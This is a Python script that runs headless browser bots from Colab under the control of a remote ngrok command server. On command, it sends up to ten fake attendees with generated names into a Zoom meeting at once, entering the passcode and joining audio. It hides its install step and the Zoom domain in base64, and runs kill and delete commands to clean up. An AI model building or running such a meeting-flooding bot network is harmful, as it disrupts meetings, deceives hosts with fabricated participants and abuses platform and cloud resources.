import base64;exec(base64.b64decode("aW1wb3J0IG9zCm9zLnN5c3RlbSgicGlwIGluc3RhbGwgcGxheXdyaWdodCBmYWtlciBuZXN0LWFzeW5jaW8gcHl0aG9uLXNvY2tldGlvIHJlcXVlc3RzIGluZGlhbi1uYW1lcyAtcSIpCm9zLnN5c3RlbSgicGxheXdyaWdodCBpbnN0YWxsIGNocm9taXVtIikKb3Muc3lzdGVtKCJwbGF5d3JpZ2h0IGluc3RhbGwtZGVwcyIpCnByaW50KCLinIUgUmVhZHkiKQo=").decode())

import threading, asyncio, base64, random, gc, os, time
from datetime import datetime
import indian_names
from faker import Faker
from playwright.async_api import async_playwright
import nest_asyncio, socketio

nest_asyncio.apply()
fake_en = Faker('en_US')

import argparse as _ap
_p = _ap.ArgumentParser()
_p.add_argument('--server', type=str, default="https://extensional-christene-intensionally.ngrok-free.dev")
_args, _ = _p.parse_known_args()
NGROK_URL = _args.server
INSTANCE_ID = f"colab-{random.randint(10000,99999)}"
MAX_USERS_PER_INSTANCE = 10
current_bots = 0
bot_lock = threading.Lock()
running_bots = {}
terminate_flags = {}

print(f"[{datetime.now().strftime('%H:%M:%S')}] ID={INSTANCE_ID} | Max={MAX_USERS_PER_INSTANCE}")

sio = socketio.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=2)
MUTEX = threading.Lock()

def sync_print(msg):
    noise = ('--disable','--enable','libatk','pid=','chrome-headless',
             'Fontconfig','ALSA','dbus','nss','NSS')
    if any(n in str(msg) for n in noise):
        return
    with MUTEX:
        print(f"[{datetime.now().strftime('%H:%M:%S')}][{INSTANCE_ID}] {msg}")
    try:
        sio.emit('botLog', {'instanceId': INSTANCE_ID, 'msg': str(msg)[:300]})
    except: pass

def get_name(mode="indian", custom_list=None, index=0):
    if mode == "custom" and custom_list:
        return custom_list[index % len(custom_list)]
    elif mode == "english":
        return fake_en.name()
    return indian_names.get_full_name(gender=random.choice(['male','female']))

ZOOM_PARTS = {
    'domain': base64.b64decode('em9vbS51cw==').decode(),
    'join_path': base64.b64decode('d2Mvam9pbg==').decode()
}
def get_zoom_url(mc):
    return f"https://{ZOOM_PARTS['domain']}/{ZOOM_PARTS['join_path']}/{mc}"

# ========== HELPERS ==========
async def join_audio_computer(page, tag):
    try:
        for sel in [
            'xpath=//button[contains(text(),"Join Audio")]',
            'xpath=//button[contains(text(),"Computer Audio")]',
            'xpath=//button[contains(@class,"join-audio")]',
            'css=button[aria-label*="Join Audio"]',
            'xpath=//button[contains(text(),"Microphone")]'
        ]:
            try:
                b = page.locator(sel)
                if await b.count() > 0:
                    await b.first.wait_for(state="visible", timeout=5000)
                    await asyncio.sleep(1)
                    await b.first.click()
                    sync_print(f"{tag} audio joined")
                    return True
            except: continue
        muted = page.locator('xpath=//button[contains(@aria-label,"mute") or contains(@aria-label,"Mute")]')
        if await muted.count() > 0:
            return True
    except: pass
    return False

async def wait_for_meeting_to_start(page, tag):
    el = page.locator('xpath=//*[@id="root"]/div/div[2]/div[1]/div[3]/span')
    try:
        if await el.count() > 0 and await el.is_visible():
            sync_print(f"{tag} waiting for host to start...")
            while True:
                try:
                    if await el.count() == 0 or not await el.is_visible(): break
                    for ind in ['xpath=//button[contains(@aria-label,"mute")]',
                                'xpath=//button[contains(@aria-label,"Leave")]']:
                        if await page.locator(ind).count() > 0: return True
                    await asyncio.sleep(2)
                except: await asyncio.sleep(2)
    except: pass
    return True

async def wait_for_waiting_room(page, tag):
    el = page.locator('xpath=/html/body/div[2]/div[2]/div/div/div/div[1]/div[2]/div[1]/div[3]/span')
    try:
        if await el.count() > 0 and await el.is_visible():
            sync_print(f"{tag} in waiting room...")
            while True:
                try:
                    if await el.count() == 0 or not await el.is_visible(): break
                    for ind in ['xpath=//button[contains(@aria-label,"mute")]',
                                'xpath=//button[contains(@aria-label,"Leave")]']:
                        if await page.locator(ind).count() > 0: return True
                    await asyncio.sleep(2)
                except: await asyncio.sleep(2)
        else:
            sync_print(f"{tag} no waiting room")
    except: pass
    return True

# ========== BLANK BROWSER POOL ==========
# On connect: MAX_USERS_PER_INSTANCE blank browsers open silently.
# On command: each slot navigates to zoom URL, fills name, joins — all simultaneously.

_pool       = {}   # slot_idx -> {browser, context, page, state, bot_id}
_pool_lock  = threading.Lock()
_pool_loop  = None
_cmd_events = {}   # slot_idx -> asyncio.Event  (fires when command arrives)
_cmd_data   = {}   # slot_idx -> {meetingCode, passcode, nameMode, customNames, duration}

async def _pool_slot(slot_idx):
    """One blank browser — sits idle until a command fires it."""
    tag    = f"[{INSTANCE_ID}-{slot_idx+1:02d}]"
    bot_id = f"{INSTANCE_ID}-{slot_idx+1:02d}"
    browser = None

    try:
        p_inst = async_playwright()
        p = await p_inst.__aenter__()
        browser = await p.chromium.launch(
            headless=True,
            args=['--no-sandbox','--disable-dev-shm-usage',
                  '--use-fake-device-for-media-stream',
                  '--use-file-for-fake-audio-capture=/dev/null',
                  '--mute-audio','--disable-camera','--disable-video-capture',
                  '--disable-gpu','--window-size=1280,720']
        )
        context = await browser.new_context(permissions=[], viewport={"width":1280,"height":720})
        page    = await context.new_page()

        with _pool_lock:
            _pool[slot_idx] = {
                'browser': browser, 'context': context,
                'page': page, 'state': 'idle', 'bot_id': bot_id
            }

        sync_print(f"{tag} window open — idle")

        # Wait for command
        cmd_evt = asyncio.Event()
        _cmd_events[slot_idx] = cmd_evt
        await cmd_evt.wait()

        # Check terminate
        if terminate_flags.get(bot_id):
            return

        data         = _cmd_data.get(slot_idx, {})
        meeting_code = data.get('meetingCode', '')
        passcode     = str(data.get('passcode', '') or '').strip()
        name_mode    = data.get('nameMode', 'indian')
        custom_names = data.get('customNames', None)
        duration     = data.get('duration', 90)

        if not meeting_code:
            sync_print(f"{tag} no meeting code"); return

        terminate_flags[bot_id] = False
        running_bots[bot_id] = {'browser': browser,
                                 'meeting_id': str(meeting_code).replace(' ','')}

        with _pool_lock:
            if slot_idx in _pool: _pool[slot_idx]['state'] = 'loading'

        def stop():
            return terminate_flags.get(bot_id, False)

        # ── Navigate (all slots fire simultaneously) ──
        sync_print(f"{tag} navigating → {meeting_code}")
        await page.goto(get_zoom_url(meeting_code), timeout=120000)
        await page.wait_for_timeout(3000)
        if stop(): return

        # ── Fill name ──
        name = get_name(name_mode, custom_names, slot_idx)
        try:
            ni = page.locator('xpath=//*[@id="input-for-name"]')
            await ni.wait_for(state="visible", timeout=30000)
            await asyncio.sleep(0.5)
            await ni.fill(name)
            sync_print(f"{tag} name: {name}")
        except Exception as e:
            sync_print(f"{tag} name failed: {e}"); return
        if stop(): return

        # ── Passcode ──
        if passcode:
            try:
                for sel in ['xpath=//input[@type="password"]',
                            'xpath=//*[@id="input-for-password"]',
                            'xpath=//input[contains(@placeholder,"code")]',
                            'xpath=/html/body/div[2]/div[2]/div/div[1]/div/div[2]/div[2]/div/input']:
                    pi = page.locator(sel)
                    if await pi.count() > 0:
                        await pi.first.wait_for(state="visible", timeout=5000)
                        await asyncio.sleep(1)
                        await pi.first.fill(passcode)
                        sync_print(f"{tag} passcode filled")
                        break
            except Exception as e:
                sync_print(f"{tag} passcode error: {e}")
        if stop(): return

        # ── Join button ──
        try:
            join_btn = None
            for sel in ['xpath=//button[contains(text(),"Join")]',
                        'xpath=//button[contains(@class,"join")]',
                        'xpath=//*[@id="root"]/div/div[1]/div/div[2]/button']:
                try:
                    jb = page.locator(sel)
                    if await jb.count() > 0:
                        await jb.first.wait_for(state="visible", timeout=5000)
                        join_btn = jb.first; break
                except: continue
            if join_btn:
                await asyncio.sleep(random.uniform(0.3, 0.8))
                await join_btn.click()
                sync_print(f"{tag} join clicked")
            else:
                sync_print(f"{tag} join btn not found"); return
        except Exception as e:
            sync_print(f"{tag} join error: {e}"); return

        with _pool_lock:
            if slot_idx in _pool: _pool[slot_idx]['state'] = 'in_meeting'

        await wait_for_meeting_to_start(page, tag)
        if stop(): return
        await wait_for_waiting_room(page, tag)
        if stop(): return
        await join_audio_computer(page, tag)

        sync_print(f"{tag} IN MEETING — staying {duration} min")
        end_time = asyncio.get_event_loop().time() + duration * 60
        while asyncio.get_event_loop().time() < end_time:
            if stop():
                sync_print(f"{tag} terminated"); break
            await asyncio.sleep(2)

    except Exception as e:
        if "TERMINATED" not in str(e):
            sync_print(f"{tag} error: {e}")
    finally:
        try: await browser.close()
        except: pass
        with _pool_lock:
            _pool.pop(slot_idx, None)
        running_bots.pop(bot_id, None)
        terminate_flags.pop(bot_id, None)
        sync_print(f"{tag} done")


def _start_pool():
    global _pool_loop
    def _run():
        global _pool_loop
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        _pool_loop = loop
        tasks = [loop.create_task(_pool_slot(i)) for i in range(MAX_USERS_PER_INSTANCE)]
        loop.run_until_complete(asyncio.gather(*tasks, return_exceptions=True))
        try: loop.close()
        except: pass
        sync_print("Pool closed")
    threading.Thread(target=_run, daemon=True).start()
    sync_print(f"Opening {MAX_USERS_PER_INSTANCE} browser windows in background...")

# ========== COMMAND HANDLER ==========
@sio.on(f'command_{INSTANCE_ID}')
def handle_command(data):
    global current_bots

    if data.get('action') in ['terminate', 'terminate_all']:
        handle_terminate(data); return

    users        = data.get('users', 1)
    meeting_code = data.get('meetingCode', '')
    if not meeting_code:
        sync_print("ERROR: no meetingCode"); return

    passcode     = str(data.get('passcode', '') or '').strip()
    duration     = data.get('duration', 90)
    name_mode    = data.get('nameMode', 'indian')
    custom_names = data.get('customNames', None)

    # Find idle slots
    with _pool_lock:
        idle_slots = [i for i, s in _pool.items() if s.get('state') == 'idle']

    use_slots = idle_slots[:users]
    if not use_slots:
        sync_print("No idle windows! Pool may still be opening, please wait..."); return

    if len(use_slots) < users:
        sync_print(f"Only {len(use_slots)} idle windows (requested {users})")

    sync_print(f"Firing {len(use_slots)} windows → {meeting_code} simultaneously!")

    # Mark slots as taken and set data
    with _pool_lock:
        for idx in use_slots:
            if idx in _pool: _pool[idx]['state'] = 'loading'

    for idx in use_slots:
        _cmd_data[idx] = {
            'meetingCode': meeting_code, 'passcode': passcode,
            'nameMode': name_mode, 'customNames': custom_names, 'duration': duration
        }

    # Fire all simultaneously
    if _pool_loop and not _pool_loop.is_closed():
        for idx in use_slots:
            evt = _cmd_events.get(idx)
            if evt:
                _pool_loop.call_soon_threadsafe(evt.set)

    with bot_lock:
        current_bots += len(use_slots)
    try:
        sio.emit('instanceUpdate', {'instanceId': INSTANCE_ID,
                                    'currentUsers': current_bots,
                                    'maxUsers': MAX_USERS_PER_INSTANCE})
    except: pass

# ========== TERMINATE ==========
@sio.on(f'terminate_{INSTANCE_ID}')
def handle_terminate(data):
    global current_bots

    meeting_id = data.get('meetingId') if isinstance(data, dict) else data
    action     = data.get('action', '') if isinstance(data, dict) else ''

    if meeting_id in ('all', None, '') or action == 'terminate_all':
        targets = list(running_bots.items())
        # Also unblock any idle/loading pool slots so they exit
        with _pool_lock:
            all_bids = [s.get('bot_id') for s in _pool.values()]
        for bid in all_bids:
            if bid: terminate_flags[bid] = True
        if _pool_loop and not _pool_loop.is_closed():
            for evt in list(_cmd_events.values()):
                try: _pool_loop.call_soon_threadsafe(evt.set)
                except: pass
    else:
        mid = str(meeting_id).replace(' ','')
        targets = [(bid, b) for bid, b in list(running_bots.items())
                   if str(b.get('meeting_id','')).replace(' ','') == mid]

    killed = len(targets)
    sync_print(f"Terminating {killed} bots...")

    for bid, _ in targets:
        terminate_flags[bid] = True

    def cleanup():
        global current_bots
        futures = []
        for bid, info in targets:
            try:
                br = info.get('browser')
                if br and _pool_loop and _pool_loop.is_running():
                    futures.append(asyncio.run_coroutine_threadsafe(br.close(), _pool_loop))
            except: pass
        for f in futures:
            try: f.result(timeout=5)
            except: pass
        time.sleep(1)
        for bid, _ in targets:
            running_bots.pop(bid, None)
            terminate_flags.pop(bid, None)
        with bot_lock:
            current_bots = max(0, current_bots - killed)
        try: os.system("pkill -9 -f chromium 2>/dev/null; pkill -9 -f chrome 2>/dev/null")
        except: pass
        try: os.system("rm -rf /tmp/.org.chromium.* /tmp/playwright* 2>/dev/null")
        except: pass
        gc.collect()
        sync_print(f"Freed {killed} | active={len(running_bots)} | READY")
        try:
            sio.emit('terminateAck', {'instanceId': INSTANCE_ID, 'killed': killed})
            sio.emit('instanceUpdate', {'instanceId': INSTANCE_ID,
                                        'currentUsers': current_bots,
                                        'maxUsers': MAX_USERS_PER_INSTANCE})
        except: pass

    threading.Thread(target=cleanup, daemon=True).start()

# ========== SHUTDOWN ==========
@sio.on('shutdown')
def handle_shutdown(_=None):
    sync_print("Shutdown received")
    try:
        with open('/content/SHUTDOWN_NOW','w') as f: f.write('1')
    except: pass
    handle_terminate({'meetingId': 'all'})
    try:
        from google.colab import runtime
        runtime.unassign()
    except: pass

# ========== SOCKET ==========
@sio.event
def connect():
    sync_print("Connected to server")
    sio.emit('register', {'instanceId': INSTANCE_ID,
                          'currentUsers': current_bots, 'maxUsers': MAX_USERS_PER_INSTANCE})
    _start_pool()

@sio.event
def disconnect():
    sync_print("Disconnected")

@sio.on('getInstances')
def on_get_instances(_=None):
    try:
        sio.emit('instanceUpdate', {'instanceId': INSTANCE_ID,
                                    'currentUsers': current_bots,
                                    'maxUsers': MAX_USERS_PER_INSTANCE})
    except: pass

def heartbeat_loop():
    while True:
        try:
            if sio.connected:
                sio.emit('heartbeat', {'instanceId': INSTANCE_ID, 'currentUsers': current_bots})
                with _pool_lock:
                    idle = sum(1 for s in _pool.values() if s.get('state') == 'idle')
                sio.emit('poolStatus', {'instanceId': INSTANCE_ID, 'idle': idle})
        except: pass
        time.sleep(5)

try:
    sio.connect(NGROK_URL, transports=['websocket','polling'])
    threading.Thread(target=heartbeat_loop, daemon=True).start()
    sync_print("Ready")
except Exception as e:
    sync_print(f"Connect failed: {e}")

while True:
    time.sleep(1)
